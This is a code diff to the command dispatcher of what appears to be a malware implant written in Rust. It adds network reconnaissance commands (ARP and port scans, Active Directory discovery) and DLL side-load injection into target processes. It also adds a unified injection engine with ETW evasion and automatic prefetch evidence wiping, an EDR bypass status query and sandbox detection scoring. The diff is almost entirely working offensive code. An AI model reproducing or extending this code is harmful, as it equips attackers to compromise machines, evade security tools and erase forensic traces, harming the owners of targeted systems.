@@ -9,12 +9,13 @@
 //! - **Loaded plugins**: Registry of dynamically loaded plugin modules.
 
 use base64::Engine;
-use common::{config::Config, AuditEvent, Command, CryptoSession, Message, Outcome};
+use common::{config::Config, AuditEvent, Command, CryptoSession, Message, NetDiscoveryOp, Outcome};
 use lazy_static::lazy_static;
 use module_loader::LoadedPlugin;
 use std::collections::HashMap;
 use std::path::Path;
 use std::sync::{Arc, Mutex};
+use std::time::Duration;
 use sysinfo::System;
 use tokio::sync::Mutex as TokioMutex;
 
@@ -214,6 +215,66 @@ pub async fn handle_command(
         }
         #[cfg(not(feature = "network-discovery"))]
         Command::DiscoverNetwork => Err("network-discovery feature not enabled".to_string()),
+
+        // ── Extended network discovery (P3-01) ──
+        #[cfg(feature = "network-discovery")]
+        Command::NetworkDiscovery { ref operation } => {
+            use std::net::IpAddr;
+            match operation {
+                NetDiscoveryOp::ArpScan => {
+                    match super::net_discovery::arp_scan() {
+                        Ok(hosts) => serde_json::to_string(&hosts)
+                            .map_err(|e| e.to_string()),
+                        Err(e) => Err(e),
+                    }
+                }
+                NetDiscoveryOp::PingSweep { subnet, timeout_ms, max_concurrent } => {
+                    match super::net_discovery::ping_sweep(
+                        subnet,
+                        Duration::from_millis(*timeout_ms),
+                        *max_concurrent,
+                    ).await {
+                        Ok(hosts) => serde_json::to_string(&hosts)
+                            .map_err(|e| e.to_string()),
+                        Err(e) => Err(e),
+                    }
+                }
+                NetDiscoveryOp::TcpPortScan { host, ports, concurrency, timeout_ms } => {
+                    let ip: IpAddr = host.parse()
+                        .map_err(|e| format!("invalid IP address '{}': {}", host, e))?;
+                    match super::net_discovery::tcp_port_scan(
+                        ip,
+                        ports,
+                        *concurrency,
+                        Duration::from_millis(*timeout_ms),
+                    ).await {
+                        Ok(open_ports) => serde_json::to_string(&open_ports)
+                            .map_err(|e| e.to_string()),
+                        Err(e) => Err(e),
+                    }
+                }
+                NetDiscoveryOp::ReverseDns { ip } => {
+                    let addr: IpAddr = ip.parse()
+                        .map_err(|e| format!("invalid IP address '{}': {}", ip, e))?;
+                    match super::net_discovery::reverse_dns_lookup(addr) {
+                        Ok(hostname) => serde_json::to_string(&hostname)
+                            .map_err(|e| e.to_string()),
+                        Err(e) => Err(e),
+                    }
+                }
+                NetDiscoveryOp::AdSrvDiscovery { domain } => {
+                    match super::net_discovery::ad_srv_discovery(domain) {
+                        Ok(records) => serde_json::to_string(&records)
+                            .map_err(|e| e.to_string()),
+                        Err(e) => Err(e),
+                    }
+                }
+            }
+        }
+        #[cfg(not(feature = "network-discovery"))]
+        Command::NetworkDiscovery { .. } => {
+            Err("network-discovery feature not enabled".to_string())
+        }
 
         #[cfg(feature = "remote-assist")]
         Command::CaptureScreen => match super::remote_assist::capture_screen() {
@@ -1245,6 +1306,16 @@ pub async fn handle_command(
             Err("evasion-transform feature not enabled".to_string())
         }
 
+        /// Query EDR bypass transform status (last scan hits, skipped, total transforms, timestamp).
+        #[cfg(feature = "evasion-transform")]
+        Command::EdrBypassStatus => {
+            Ok(crate::edr_bypass_transform::status())
+        }
+        #[cfg(not(feature = "evasion-transform"))]
+        Command::EdrBypassStatus => {
+            Err("evasion-transform feature not enabled".to_string())
+        }
+
         /// NTFS transaction-based process hollowing with ETW blinding.
         #[cfg(feature = "transacted-hollowing")]
         Command::TransactedHollow { target_process, payload, etw_blinding } => {
@@ -1325,6 +1396,142 @@ pub async fn handle_command(
         #[cfg(not(feature = "delayed-stomp"))]
         Command::DelayedStomp { .. } => {
             Err("delayed-stomp feature not enabled".to_string())
+        }
+
+        // ── DLL side-load injection with export forwarding ──────────────
+        // Decrypts the payload, opens the target process, resolves the
+        // forward target DLL via PEB walk, patches export table entries,
+        // and executes via NtCreateThreadEx.  Produces a side-loaded DLL
+        // with a legitimate export table in memory.
+        #[cfg(windows)]
+        Command::InjectSideLoad { pid, payload, export_config } => {
+            use crate::injection::dll_sideload::DllSideLoadInjector;
+            let injector = DllSideLoadInjector;
+            match injector.inject_with_export_forwarding(*pid, payload, export_config) {
+                Ok(()) => {
+                    match serde_json::to_string_pretty(&serde_json::json!({
+                        "pid": pid,
+                        "technique": "InjectSideLoad",
+                        "forward_target": export_config.forward_target,
+                        "named_exports": export_config.named_exports.len(),
+                        "ordinal_exports": export_config.ordinal_exports.len(),
+                        "payload_size": payload.len(),
+                    })) {
+                        Ok(json) => Ok(json),
+                        Err(e) => Err(format!("serialization failed: {e}")),
+                    }
+                }
+                Err(e) => Err(format!("inject side-load failed: {e}")),
+            }
+        }
+        #[cfg(not(windows))]
+        Command::InjectSideLoad { .. } => {
+            Err("InjectSideLoad is only available on Windows".to_string())
+        }
+
+        // ── Unified injection engine ───────────────────────────────────
+        // Dispatches through the injection_engine module which provides
+        // automatic technique selection, EDR reconnaissance, ETW evasion,
+        // and fallback chains across all 12 technique variants.
+        #[cfg(windows)]
+        Command::UnifiedInject {
+            target_process,
+            payload,
+            technique,
+            evade,
+        } => {
+            let parsed_technique = match technique.as_deref() {
+                None | Some("auto") => None,
+                Some(name) => {
+                    match crate::injection_engine::parse_technique(name) {
+                        Ok(t) => Some(t),
+                        Err(e) => return Err(format!("invalid technique {:?}: {e}", technique)),
+                    }
+                }
+            };
+
+            let config = crate::injection_engine::InjectionConfig {
+                technique: parsed_technique,
+                target_process: target_process.clone(),
+                payload: payload.clone(),
+                prefer_same_arch: true,
+                evade_etw: *evade,
+                timeout_ms: 30_000,
+            };
+
+            let result = if *evade {
+                crate::injection_engine::evasiveness_inject(config)
+            } else {
+                crate::injection_engine::inject(config)
+            };
+
+            match result {
+                Ok(handle) => {
+                    // Post-injection hook: auto-clean prefetch evidence.
+                    #[cfg(feature = "forensic-cleanup")]
+                    crate::forensic_cleanup::prefetch::auto_clean_after_injection(
+                        target_process.as_str()
+                    );
+                    match serde_json::to_string_pretty(&serde_json::json!({
+                        "pid": handle.target_pid,
+                        "base_addr": format!("{:#x}", handle.injected_base_addr),
+                        "technique": format!("{:?}", handle.technique_used),
+                        "payload_size": handle.payload_size,
+                        "sleep_enrolled": handle.sleep_enrolled,
+                    })) {
+                        Ok(json) => Ok(json),
+                        Err(e) => Err(format!("serialization failed: {e}")),
+                    }
+                }
+                Err(e) => Err(format!("unified injection failed: {e}")),
+            }
+        }
+        #[cfg(not(windows))]
+        Command::UnifiedInject { .. } => {
+            Err("UnifiedInject is only available on Windows".to_string())
+        }
+
+        // ── Sandbox scoring pipeline ────────────────────────────────────
+        // Run a comprehensive sandbox/VM detection sweep and return the
+        // full indicator breakdown (category, detail, weight, source)
+        // together with the total score and the threshold used.
+        Command::SandboxCheck => {
+            let indicators = crate::env_check::collect_indicators();
+            let (is_sandbox, _) = crate::env_check::evaluate_sandbox_score(&indicators);
+            let total_weight: u32 = indicators.iter().map(|i| i.weight).sum();
+            let cloud_hypervisor = indicators.iter().any(|i| {
+                i.category == "cloud_bios" && i.detail.contains("DMI/registry")
+            });
+            let cloud_imds = indicators.iter().any(|i| {
+                i.category == "cloud_bios" && i.detail.contains("IMDS")
+            });
+
+            // Replicate threshold calculation from evaluate_sandbox_score
+            let hypervisor_bit_set = indicators.iter().any(|i| {
+                i.category == "hypervisor" && i.detail.contains("CPUID")
+            });
+            let likely_legitimate_server = hypervisor_bit_set
+                && crate::env_check::get_ram_gb() > 4
+                && crate::env_check::get_uptime_secs() > 24 * 3600;
+            let threshold = if cloud_hypervisor && cloud_imds {
+                60
+            } else if cloud_hypervisor || cloud_imds {
+                30
+            } else if likely_legitimate_server {
+                40
+            } else {
+                30
+            };
+
+            let result = serde_json::json!({
+                "is_sandbox": is_sandbox,
+                "total_weight": total_weight,
+                "threshold": threshold,
+                "indicator_count": indicators.len(),
+                "indicators": indicators,
+            });
+            Ok(serde_json::to_string(&result)
+                .unwrap_or_else(|e| format!("{{\"error\": \"{e}\"}}")))
         }
 
         // ── Syscall emulation toggle ────────────────────────────────────
@@ -1427,6 +1634,32 @@ pub async fn handle_command(
         #[cfg(not(all(windows, feature = "forensic-cleanup")))]
         Command::RestorePrefetch => {
             Err("forensic-cleanup feature not enabled".to_string())
+        }
+
+        // ── Page Tracker telemetry gateway ──────────────────────────────
+        // PageTrackerStatus is the only authorized way to query page
+        // tracker state from outside the crate.  The underlying
+        // status_json() is pub(crate) to prevent uncontrolled access.
+        // Once RBAC (P1-26) is implemented, this command will require
+        // at least read permission level.
+        #[cfg(all(windows, feature = "evanesco"))]
+        Command::PageTrackerStatus => {
+            Ok(crate::page_tracker::status_json())
+        }
+        #[cfg(not(all(windows, feature = "evanesco")))]
+        Command::PageTrackerStatus => {
+            Err("evanesco feature not enabled".to_string())
+        }
+
+        // Redacted version for lower-privilege callers — page counts
+        // only, no timing/counters/thresholds.
+        #[cfg(all(windows, feature = "evanesco"))]
+        Command::PageTrackerStatusRedacted => {
+            Ok(crate::page_tracker::status_redacted())
+        }
+        #[cfg(not(all(windows, feature = "evanesco")))]
+        Command::PageTrackerStatusRedacted => {
+            Err("evanesco feature not enabled".to_string())
         }
     };
 
